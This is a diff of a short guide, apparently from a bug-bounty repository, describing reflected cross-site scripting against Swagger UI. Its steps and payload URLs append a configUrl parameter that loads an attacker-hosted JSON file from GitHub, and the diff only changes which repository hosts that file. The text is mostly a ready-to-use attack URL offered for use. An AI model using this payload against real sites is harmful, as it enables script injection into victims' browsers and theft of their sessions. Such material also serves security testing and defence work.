@@ -7,7 +7,7 @@ if a domain is is running swagger ,
 2. if site have some endpoint like this
 https://domain.ltd/index.html
 
-3. payload : ?configUrl=https://raw.githubusercontent.com/NotSecure-In/swagger-xss/main/test.json
+3. payload : ?configUrl=https://raw.githubusercontent.com/adrianalvird/swagger-ui-xss/main/test.json
 
 4. so entire rxss will look like this
-5. https://domain.ltd/index.html?configUrl=https://raw.githubusercontent.com/NotSecure-In/swagger-xss/main/test.json
+5. https://domain.ltd/index.html?configUrl=https://raw.githubusercontent.com/adrianalvird/swagger-ui-xss/main/test.json
